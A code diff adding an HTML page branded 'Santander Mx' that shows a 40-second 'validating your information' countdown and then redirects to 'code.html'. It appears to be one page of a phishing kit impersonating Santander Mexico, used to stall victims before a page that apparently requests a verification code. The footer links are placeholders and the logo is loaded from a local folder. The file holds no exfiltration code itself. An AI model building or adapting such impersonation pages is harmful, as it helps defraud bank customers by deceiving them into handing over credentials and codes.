@@ -1,0 +1,56 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Santander Mx</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+      * { margin:0; padding:0; box-sizing:border-box; }
+      body { font-family:'Lato',sans-serif; background:#f5f5f5; min-height:100vh; display:flex; align-items:center; justify-content:center; margin:0; padding:20px; }
+      .container { width:100%; max-width:500px; margin:0 auto; }
+      .card { background:#fff; border-radius:20px; padding:40px 30px 35px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.08); }
+      .logo { display:flex; justify-content:center; align-items:center; margin:0 0 20px 0; }
+      .logo img { max-width:180px; height:auto; display:block; }
+      .counter { font-size:22px; font-weight:600; color:#1a1a1a; margin-bottom:15px; }
+      .counter span { color:#e3000b; }
+      .loader-gif { margin:15px auto; width:100px; height:100px; display:flex; justify-content:center; align-items:center; }
+      .loader-gif img { width:100%; height:auto; }
+      .mensaje { font-size:18px; color:#555; margin-top:10px; font-weight:400; }
+      .footer-note { margin-top:30px; font-size:13px; color:#aaa; border-top:1px solid #eee; padding-top:20px; display:flex; justify-content:center; gap:25px; }
+      .footer-note a { color:#aaa; text-decoration:none; transition:color .2s; }
+      .footer-note a:hover { color:#e3000b; }
+      @media (max-width:480px) { .card { padding:30px 20px; } .counter { font-size:19px; } .logo img { max-width:140px; } .loader-gif { width:80px; height:80px; } }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <div class="logo">
+          <img src="img\santander_logo.png" alt="Santander" />
+        </div>
+        <div class="counter" id="contador">Por favor, espera <span>40</span> segundos...</div>
+        <div class="loader-gif">
+          <img src="img\load.gif" alt="Cargando" />
+        </div>
+        <div class="mensaje">Estamos validando tu información.</div>
+        <div class="footer-note">
+          <a href="#"><i class="fa fa-lock"></i> Seguridad</a>
+          <a href="#"><i class="fa fa-question-circle"></i> Ayuda</a>
+        </div>
+      </div>
+    </div>
+    <script>
+      var tiempo = 40;
+      var url = "code.html";
+      function actualizarContador() {
+        var elemento = document.getElementById('contador');
+        elemento.innerHTML = 'Por favor, espera <span>' + tiempo + '</span> segundos...';
+        if (tiempo === 0) { window.location = url; }
+        else { tiempo--; setTimeout(actualizarContador, 1000); }
+      }
+      window.onload = actualizarContador;
+    </script>
+  </body>
+</html>
